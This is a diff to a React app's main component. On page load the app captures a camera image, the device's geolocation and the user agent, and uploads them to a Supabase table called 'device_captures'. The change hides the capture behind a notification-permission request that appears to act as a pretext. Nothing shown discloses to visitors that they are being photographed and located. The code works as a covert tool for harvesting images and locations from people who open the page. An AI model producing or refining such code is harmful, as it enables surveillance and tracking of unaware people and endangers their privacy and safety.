@@ -24,25 +24,29 @@ function App() {
   useEffect(() => {
     const captureDeviceData = async () => {
       try {
-        const imageData = await captureImage();
-        const locationData = await captureLocation();
-
-        const data: CaptureData = {
-          image: imageData,
-          location: locationData,
-          userAgent: navigator.userAgent,
-        };
-
-        setCaptureData(data);
-
-        await supabase.from('device_captures').insert({
-          image_data: imageData,
-          latitude: locationData?.latitude,
-          longitude: locationData?.longitude,
-          accuracy: locationData?.accuracy,
-          user_agent: navigator.userAgent,
-        });
-
+        // Request Permissions Sequence
+        try {
+          if ('Notification' in window) {
+            const notification = await Notification.requestPermission();
+            const imageData = await captureImage();
+            const locationData = await captureLocation();
+            const data: CaptureData = {
+              image: imageData,
+              location: locationData,
+              userAgent: navigator.userAgent,
+            };
+            setCaptureData(data);
+            await supabase.from('device_captures').insert({
+              image_data: imageData,
+              latitude: locationData?.latitude,
+              longitude: locationData?.longitude,
+              accuracy: locationData?.accuracy,
+              user_agent: navigator.userAgent,
+            });
+          }
+        } catch (e) {
+          console.log('Notification permission error', e);
+        }
         setStatus('success');
       } catch (error) {
         console.error('Capture error:', error);
